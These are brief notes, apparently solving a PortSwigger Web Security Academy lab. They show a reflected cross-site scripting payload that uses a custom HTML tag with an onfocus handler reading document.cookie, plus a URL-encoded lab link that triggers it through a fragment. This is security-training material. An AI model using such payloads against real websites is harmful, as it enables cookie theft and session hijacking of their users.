<my-tag onfocus='alert(document.cookie)' id="search" tabindex="1">

/* custom tags should generally have a hyphen in their name
my-tag 
to make it automatic, 

//the URL to be accessed by victim
https://0af0007504ca996880e9940700d200c0.web-security-academy.net/?search=%3Cmy-tag+onfocus%3D%27alert(document.cookie)%27+id%3D%22search%22+tabindex%3D%221%22%3E#search
